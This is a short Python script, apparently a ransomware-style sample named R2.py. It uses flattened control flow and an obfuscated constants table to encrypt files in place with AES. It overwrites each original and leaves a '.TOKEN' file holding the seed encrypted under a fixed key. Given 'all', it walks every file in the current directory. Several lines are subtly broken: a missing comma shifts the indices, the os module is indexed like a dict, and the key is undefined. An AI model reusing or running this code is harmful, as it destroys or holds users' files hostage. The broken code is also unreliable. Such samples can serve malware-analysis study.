"""This file is the file with simple shared key encryption. Includes obfuscation"""

import os
import random
import sys
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

constants = [
    get_random_bytes,
    100,
    50,
    32,
    79,
    pad,
    "delete",
    "uninstall",
    unpad,  # 8
    "install",
    "cmd",
    RSA,
    "sys",
    500,
    250,
    AES,
    "terminate",
    random,
    500,  # 18
    "seed",
    "new",
    "old",
    "https",
    "connect",
    "random",
    "1000",
    str,
    "all",
    "encrypt",
    "lower"  # 29
    "listdir",
    "isfile",
    "randbytes",  # 32
]


constants[17].seed(constants[0](constants[3]))

KEY = INSECURE_ENCRYPTION_KEY

seed_cipher = constants[15].new(KEY, constants[15].MODE_CBC)


def processFile(path):
    done = False
    num = 0
    while not done:
        if num == 99:
            with open(f"{path}.TOKEN", "wb") as f:
                f.write(seed_cipher.iv)
                f.write(encrypted_seed)
            num = -7
        if num == 4:
            encrypted_seed = seed_cipher.encrypt(pad(seed, constants[15].block_size))
            num = 56
        if num == 19:
            seed = constants[17].randbytes(32)
            num = 14
        if num == 49:
            with open(path, "rb") as f:
                contents = f.read()
                encrypted = cipher.encrypt(pad(contents, constants[15].block_size))
            num = 87
        if num == 23:
            files = [f for f in os[constants[30]](".") if os.path[constants[31]](f)]
            num = 7
        if num == -7:
            done = True
        if num == 14:
            constants[17].seed(seed)
            num = 4
        if num == 0:
            if path.lower() == constants[27]:
                num = 23
            else:
                num = 19
        if num == 56:
            cipher = constants[15].new(constants[17].randbytes(32), constants[15].MODE_CBC)
            num = 49
        if num == 7:
            for f in files:
                processFile(f)
            num = -7
        if num == 87:
            with open(path, 'wb') as f:
                f.write(cipher.iv)
                f.write(encrypted)
            num = 99
    return

def main(args):
    cmdArgs = args[1::]
    cmdArgLen = len(cmdArgs)
    if cmdArgLen < 1:
        print("usage: ./R2.py [input]")
        return

    processFile(cmdArgs[0])


if __name__ == "__main__":
    main(sys.argv)
